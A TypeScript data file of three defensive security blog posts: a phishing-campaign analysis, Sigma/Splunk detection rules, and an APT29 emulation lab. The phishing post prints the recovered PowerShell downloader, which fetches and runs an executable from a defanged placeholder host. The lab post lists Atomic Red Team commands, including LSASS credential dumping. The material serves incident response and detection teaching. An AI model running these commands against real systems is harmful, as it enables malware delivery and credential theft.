export interface BlogPost {
  slug: string;
  title: string;
  summary: string;
  date: string;
  tags: string[];
  readTime: string;
  content: string;
}

export const blogPosts: BlogPost[] = [
  {
    slug: "dissecting-phishing-campaign",
    title: "Dissecting a Phishing Campaign: From Email to C2",
    summary:
      "A step-by-step breakdown of a real-world phishing attack chain — header analysis, payload extraction, sandbox results, and IOC mapping to MITRE ATT&CK.",
    date: "Jan 2025",
    tags: ["Phishing", "Incident Response"],
    readTime: "8 min read",
    content: `## Overview

In this write-up, I walk through a real-world phishing campaign I analyzed during a SOC shift. The attack chain began with a seemingly legitimate invoice email and ended with a remote access trojan (RAT) beaconing to a command-and-control server.

## Initial Triage

The alert fired from our email gateway when a user reported a suspicious attachment. Here's what stood out:

- **Subject line:** "Invoice #INV-2025-0042 — Payment Overdue"
- **Sender domain:** Spoofed to resemble a known vendor
- **Attachment:** \`.xlsx\` file with embedded macros

### Email Header Analysis

\`\`\`
Received: from mail-evil[.]com (198.51.100.23)
X-Mailer: PHPMailer 6.1.4
Return-Path: <billing@leg1tvendor[.]com>
\`\`\`

The \`Return-Path\` didn't match the \`From\` header — a classic spoofing indicator. SPF and DKIM both failed for the sending domain.

## Payload Analysis

I extracted the macro from the \`.xlsx\` attachment using \`olevba\`:

\`\`\`bash
olevba invoice_2025_0042.xlsx
\`\`\`

The macro contained obfuscated PowerShell that downloaded a second-stage payload:

\`\`\`powershell
$url = "hxxps://cdn-update[.]evil/payload.exe"
Invoke-WebRequest -Uri $url -OutFile "$env:TEMP\\svchost.exe"
Start-Process "$env:TEMP\\svchost.exe"
\`\`\`

## Sandbox Results

I detonated the payload in an isolated sandbox:

| Indicator | Value |
|-----------|-------|
| **File hash (SHA256)** | \`a1b2c3d4e5f6....\` |
| **C2 Server** | \`198.51.100.50:443\` |
| **Protocol** | HTTPS with custom cert |
| **Persistence** | Registry Run key |
| **Classification** | AsyncRAT variant |

## IOC Mapping to MITRE ATT&CK

| Technique | ID | Description |
|-----------|----|-------------|
| Phishing: Spearphishing Attachment | T1566.001 | Malicious Excel with macros |
| Command and Scripting Interpreter | T1059.001 | PowerShell downloader |
| Boot or Logon Autostart Execution | T1547.001 | Registry Run key persistence |
| Application Layer Protocol | T1071.001 | HTTPS C2 communication |

## Containment & Response

1. **Isolated** the affected endpoint from the network
2. **Blocked** the C2 IP and domain at the firewall and proxy
3. **Scanned** all mailboxes for the same sender/subject combination
4. **Reset** the user's credentials as a precaution
5. **Submitted** IOCs to our threat intel platform

## Lessons Learned

- Email gateway rules were updated to flag \`.xlsx\` files with macros from external senders
- Detection rule added for PowerShell downloading executables to \`%TEMP%\`
- User awareness training reinforced for invoice-themed phishing

---

*This analysis was performed in a controlled environment. All IOCs have been defanged for safe sharing.*`,
  },
  {
    slug: "building-detection-rules-sigma-splunk",
    title: "Building Detection Rules with Sigma & Splunk",
    summary:
      "How I wrote and tested 20+ Sigma rules for lateral movement detection, converted them to SPL, and deployed them in a home lab Splunk instance.",
    date: "Dec 2024",
    tags: ["Detection Engineering", "Splunk"],
    readTime: "6 min read",
    content: `## Why Sigma?

Sigma is a generic signature format for SIEM systems. Writing rules in Sigma means they're portable — you write once and convert to Splunk SPL, Elastic KQL, Microsoft Sentinel, and more.

## Setting Up the Pipeline

My workflow:

1. **Write** Sigma rules in YAML
2. **Convert** to SPL using \`sigma-cli\`
3. **Test** against sample logs in my home lab Splunk instance
4. **Validate** detections with Atomic Red Team

## Example: Detecting PsExec Lateral Movement

Here's a Sigma rule I wrote to detect PsExec-style remote service creation:

\`\`\`yaml
title: PsExec Remote Service Installation
status: experimental
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    EventID: 7045
    ServiceName|contains: 'PSEXE'
  condition: selection
level: high
tags:
  - attack.lateral_movement
  - attack.t1021.002
\`\`\`

### Converting to SPL

\`\`\`bash
sigma convert -t splunk -p sysmon rules/psexec_service.yml
\`\`\`

Output:

\`\`\`spl
index=windows EventCode=7045 ServiceName="*PSEXE*"
| table _time, ComputerName, ServiceName, ImagePath
\`\`\`

## Testing with Atomic Red Team

I ran the corresponding Atomic test to validate the rule fires:

\`\`\`powershell
Invoke-AtomicTest T1021.002 -TestNumbers 1
\`\`\`

The alert triggered within seconds in Splunk — confirming end-to-end detection.

## Coverage Dashboard

After building 20+ rules, I created a Splunk dashboard mapping detection coverage to MITRE ATT&CK:

- **Initial Access:** 4 rules
- **Execution:** 5 rules
- **Lateral Movement:** 6 rules
- **Persistence:** 3 rules
- **Defense Evasion:** 4 rules

## Key Takeaways

- Sigma provides **vendor-agnostic** detection logic
- Always **test rules** against real attack simulations before deploying
- Map every rule to a **MITRE ATT&CK technique** for coverage tracking
- Maintain a **living document** of rule performance (false positive rates, tuning notes)

---

*All rules are available in my GitHub detection-rules repository.*`,
  },
  {
    slug: "home-lab-apt29-simulation",
    title: "Home Lab Chronicles: Simulating APT29 with Atomic Red Team",
    summary:
      "Documenting my experience running APT29 emulation in a contained environment using Atomic Red Team, Security Onion, and Sysmon logging.",
    date: "Nov 2024",
    tags: ["Threat Emulation", "Blue Team"],
    readTime: "10 min read",
    content: `## The Goal

I wanted to understand APT29 (Cozy Bear) tactics by emulating their techniques in a safe lab environment and seeing what defenders actually see in their logs.

## Lab Architecture

\`\`\`
┌─────────────┐     ┌──────────────┐     ┌─────────────────┐
│  Attacker   │────▶│  Windows 10  │────▶│  Security Onion  │
│  (Kali)     │     │  (Target)    │     │  (SIEM/IDS)      │
└─────────────┘     └──────────────┘     └─────────────────┘
                          │
                    Sysmon + WinRM
                    Event Forwarding
\`\`\`

### Components

- **Kali Linux** — Attack machine running Atomic Red Team
- **Windows 10 VM** — Target with Sysmon, PowerShell logging, and WinRM
- **Security Onion** — Network monitoring with Suricata + Zeek, log aggregation
- **Splunk Free** — Additional log analysis

## APT29 Techniques Emulated

I focused on techniques from the [MITRE ATT&CK APT29 page](https://attack.mitre.org/groups/G0016/):

### 1. Spearphishing Link (T1566.002)

Simulated a user clicking a malicious link that downloads a PowerShell script:

\`\`\`powershell
Invoke-AtomicTest T1566.002
\`\`\`

**What I saw in logs:**
- Sysmon Event ID 1: PowerShell spawned from browser process
- Sysmon Event ID 3: Outbound HTTP connection to download server

### 2. Credential Dumping with Mimikatz (T1003.001)

\`\`\`powershell
Invoke-AtomicTest T1003.001 -TestNumbers 1
\`\`\`

**What I saw in logs:**
- Sysmon Event ID 10: Process access to \`lsass.exe\`
- Windows Security Event 4656: Handle requested to LSASS

### 3. Scheduled Task Persistence (T1053.005)

\`\`\`powershell
Invoke-AtomicTest T1053.005 -TestNumbers 1
\`\`\`

**What I saw in logs:**
- Windows Event ID 4698: Scheduled task created
- Sysmon Event ID 1: \`schtasks.exe\` execution

## Detection Gaps Found

During the simulation, I discovered:

1. **PowerShell Script Block Logging** wasn't enabled — fixed this immediately
2. **Sysmon config** was missing rules for WMI event subscriptions
3. **Network-level detection** caught the C2 traffic that host-based logs missed

## What I Learned

- **Blue team visibility** depends heavily on logging configuration
- Running attack simulations reveals **blind spots** you'd never find otherwise
- **Sysmon + PowerShell logging + network monitoring** provides layered detection
- APT29's techniques are sophisticated but **detectable** with proper instrumentation

## Next Steps

- Expand emulation to cover APT28 and FIN7
- Build automated detection validation pipeline
- Create a detection coverage heat map

---

*This lab was run in an isolated virtual environment with no connection to production networks.*`,
  },
];
